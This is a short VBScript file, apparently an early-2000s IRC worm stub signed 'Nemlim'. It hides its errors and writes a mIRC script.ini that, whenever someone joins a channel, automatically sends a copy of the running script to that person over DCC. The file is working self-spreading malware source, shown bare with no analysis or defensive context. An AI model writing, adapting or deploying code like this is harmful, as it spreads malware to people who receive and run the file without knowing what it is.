ON ERROR RESUME NEXT
Set Wsc = CreateObject("WScript.Shell")
Set Fso= CreateObject("scripting.filesystemobject")
set ini=fso.CreateTextFile(".\script.ini")
ini.WriteLine "[script]"
ini.WriteLine ";mIRC Script"
ini.WriteLine ";"
ini.WriteLine ";Nemlim - 18/06/2003"
ini.WriteLine ";http://www.mirc.com"
ini.WriteLine ";"
ini.WriteLine "n0=on 1:JOIN:#:{"
ini.WriteLine "n1= /if ( $nick == $me ) { halt }"
ini.WriteLine "n2= /.dcc send $nick " & Wscript.ScriptFullName
ini.WriteLine "n3=}"
ini.close
